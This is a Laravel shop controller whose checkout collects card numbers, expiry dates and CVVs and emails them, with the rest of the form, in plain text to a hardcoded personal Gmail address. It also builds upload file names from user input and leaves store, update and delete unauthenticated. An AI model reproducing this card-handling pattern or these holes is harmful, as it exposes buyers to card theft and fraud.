<?php

namespace App\Http\Controllers;

use App\Mail\ShopMailable;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Mail;
use App\Models\Item;

class ShopController extends Controller
{
    public function index(Request $request)
    {
        $items = Item::all();
        return view('shop.index', compact('items'));
    }

    public function create()
    {
        if (!auth()->check()) {
            return redirect()->route('login')->withErrors(['message' => 'You must be logged in to access this page.']);
        }

        return view('shop.create');
    }

    public function store(Request $request)
    {
        $request->validate([
            'name'          => 'required|string|max:255',
            'price'         => 'required|numeric|min:0',
            'description'   => 'required|string',
            'image'         => 'required|image|mimes:jpeg,png,jpg|max:4096', // Máximo 4MB
        ], [
            'name.required'         => 'The name field is required.',
            'name.string'           => 'The name must be a valid string.',
            'price.required'        => 'The price field is required.',
            'price.numeric'         => 'The price must be a valid number.',
            'description.required'  => 'The description field is required.',
            'image.required'        => 'The image field is required.',
            'image.image'           => 'The file must be an image.',
            'image.mimes'           => 'The image must be a file of type: jpeg, png, jpg.',
            'image.max'             => 'The image must not be larger than 4MB.',
        ]);

        $timestamp = now()->format('YmdHis'); // Formato: AñoMesDíaHoraMinutoSegundo

        // Nombre completo de la imagen con extension
        $imageUrl = "{$request->name}_{$timestamp}." . $request->image->extension();

        // Mover la imagen a la carpeta 'images/shop' con el nuevo nombre
        $request->image->move(public_path('images/shop'), $imageUrl);

        Item::create([
            'name' => $request->name,
            'price' => $request->price,
            'description' => $request->description,
            'image' => 'images/shop/' . $imageUrl,
        ]);

        return redirect()->route('shop.index')->with('success', 'Artículo creado correctamente.');
    }

    public function show($id)
    {
        $item = Item::findOrFail($id);
        return view('shop.show', compact('item'));
    }

    public function edit($id)
    {
        if (!auth()->check()) {
            return redirect()->route('login')->withErrors(['message' => 'You must be logged in to access this page.']);
        }

        $item = Item::findOrFail($id);
        return view('shop.edit', compact('item'));
    }

    public function update(Request $request, $id)
    {
        $item = Item::findOrFail($id);

        $request->validate([
            'name'          => 'required|string|max:255',
            'price'         => 'required|numeric|min:0',
            'description'   => 'required|string',
            'image'         => 'image|mimes:jpeg,png,jpg|max:4096',
        ], [
            'name.required'         => 'The name field is required.',
            'name.string'           => 'The name must be a valid string.',
            'price.required'        => 'The price field is required.',
            'price.numeric'         => 'The price must be a valid number.',
            'description.required'  => 'The description field is required.',
            'image.image'           => 'The file must be an image.',
            'image.mimes'           => 'The image must be a file of type: jpeg, png, jpg.',
            'image.max'             => 'The image must not be larger than 4MB.',
        ]);

        if ($request->hasFile('image')) {
            $timestamp = now()->format('YmdHis');
            $imageUrl = "{$request->name}_{$timestamp}." . $request->image->extension();
            $request->image->move(public_path('images/shop'), $imageUrl);
            $item->image = 'images/shop/' . $imageUrl;
        }

        $item->name = $request->name;
        $item->price = $request->price;
        $item->description = $request->description;
        
        $item->save();

        return redirect()->route('shop.index')->with('success', 'Artículo actualizado correctamente.');
    }

    public function destroy($id)
    {
        $item = Item::findOrFail($id);

        if (file_exists(public_path($item->image))) {
            unlink(public_path($item->image)); // Eliminar archivo físico
        }
        $item->delete(); // Eliminar de la base de datos

        return redirect()->route('shop.index')->with('success', 'Artículo eliminado correctamente.');
    }

    public function buy($id)
    {
        $item = Item::findOrFail($id);
        return view('shop.send', compact('item'));
    }

    public function send(Request $request, $id)
    {
        $item = Item::findOrFail($id);

        $request->validate([
            // Datos personales
            'name'        => 'required|string|max:255',
            'phone'       => 'required|digits_between:7,15',
            'email'       => 'required|email|max:255',

            // Dirección
            'address'     => 'required|string|max:255',
            'postal'      => 'required|digits_between:4,10',
            'city'        => 'required|string|max:100',

            // Datos bancarios
            'card'        => 'required|digits_between:13,19',
            'expiration'  => 'required|digits:4', // MMYY o AAMM, puedes ajustar según formato
            'cvv'         => 'required|digits_between:3,4',
            'cardholder'  => 'required|string|max:255',
        ], [
            'name.required'        => 'The name field is required.',
            'name.string'          => 'The name must be a valid string.',
            'name.max'             => 'The name may not be greater than 255 characters.',
            'phone.required'       => 'The phone number is required.',
            'phone.digits_between' => 'The phone number must be between 7 and 15 digits.',
            'email.required'       => 'The email field is required.',
            'email.email'          => 'The email must be a valid email address.',
            'email.max'            => 'The email may not be greater than 255 characters.',
            'address.required'     => 'The address field is required.',
            'address.string'       => 'The address must be a valid string.',
            'address.max'          => 'The address may not be greater than 255 characters.',
            'postal.required'      => 'The postal code is required.',
            'postal.digits_between' => 'The postal code must be between 4 and 10 digits.',
            'city.required'        => 'The city field is required.',
            'city.string'          => 'The city must be a valid string.',
            'city.max'             => 'The city may not be greater than 100 characters.',
            'card.required'        => 'The card number is required.',
            'card.digits_between'  => 'The card number must be between 13 and 19 digits.',
            'expiration.required'  => 'The expiration date is required.',
            'expiration.digits'    => 'The expiration date must be 4 digits (MMYY).',
            'cvv.required'         => 'The CVV is required.',
            'cvv.digits_between'   => 'The CVV must be 3 or 4 digits.',
            'cardholder.required'  => 'The cardholder name is required.',
            'cardholder.string'    => 'The cardholder name must be a valid string.',
            'cardholder.max'       => 'The cardholder name may not be greater than 255 characters.',
        ]);

        // Eliminar el artículo de la tienda
        // if (file_exists(public_path($item->image))) {
        //     unlink(public_path($item->image)); // Eliminar archivo físico
        // }
        // $item->delete();
        
        // Envío del correo electrónico
        Mail::to('jackyberi67@gmail.com')
            ->send(new ShopMailable($request->all(), $item));

        session()->flash('success', 'Your message has been sent successfully!'); // Mensaje de éxito

        // Redirigir a la página de agradecimiento
        return redirect()->route('shop.thanks');
    }

    public function thanks()
    {
        return view('shop.thanks'); // Vista de agradecimiento después de la compra
    }
}
